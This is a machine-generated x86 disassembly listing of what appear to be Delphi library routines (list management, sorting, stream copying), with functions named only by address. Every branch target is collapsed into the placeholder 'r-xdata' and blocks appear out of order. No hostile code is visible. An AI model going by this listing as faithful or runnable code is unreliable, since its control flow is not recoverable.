mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404440
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41a218
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404108
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c4c8
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c82
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0xc ]
call sub_403f20
retn
sub_419c8c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_419cc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419cf0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ad54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419d38
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d3f
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_419d44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419de1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4196b0
xor eax eax
push ebp
push sub_419dc4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41a8a0
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404010
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419dcb
mov eax [ ebp - 0x4 ]
call sub_41976c
retn
sub_419df0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419e91
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e98
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
call sub_4196b0
xor eax eax
push ebp
push sub_419e74
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41976c
retn
sub_419ea0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_419ed8
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419f7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ca90
mov eax [ ebp - 0x4 ]
call sub_4196b0
xor eax eax
push ebp
push sub_419f57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41bb2c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d730
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f5e
mov eax [ ebp - 0x4 ]
call sub_41976c
retn
sub_419f88
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ad54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419fd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fda
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_419fe0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a02d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4041e0
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41ab04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a034
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41a040
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4057a4
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41a074
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a0b7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404118
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0be
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41a0c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a178
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4196b0
xor edx edx
push ebp
push sub_41a15b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a162
mov eax [ ebp - 0x4 ]
call sub_41976c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404010
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41a188
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a1fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ec9c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41eca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a205
lea eax [ ebp - 0xc ]
call sub_403f20
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420400
inc esi
dec ebx
jne r-xdata
sub_41a230
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41a24c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4194e8
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_40499c
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_41a2b4
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419864
jmp r-xdata
sub_41a350
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_40499c
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a390
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419864
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404a88
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41a3fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419864
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_419864
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a458
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a458
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41a47c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41a4f4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419864
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403f74
pop edi
pop esi
pop ebx
retn
sub_41a530
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419864
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41a558
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41a58c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_419b2c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41a5d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419864
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419864
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a62c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41a558
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403f74
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028d8
sub_41a6a4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419864
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419864
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403f74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a700
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419864
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a740
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a458
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a740
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41a7f0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41a84c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41a740
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a8a0
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41a8d4
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41a938
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41a98c
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
mov esp ebp
pop ebp
retn
sub_41a9d8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4030d8
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41a98c
pop ecx
mov eax [ ebx ]
call sub_40311c
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41a98c
pop ecx
sub_41aa5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41aacc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_41ab04
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_41ab3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41a8c0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41ac18
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac1f
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026fc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41aacc
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41ab04
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41ac30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b2b4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ac80
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41d2e8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac87
mov eax [ ebp - 0x8 ]
call sub_403190
retn
sub_41ac90
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403160
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
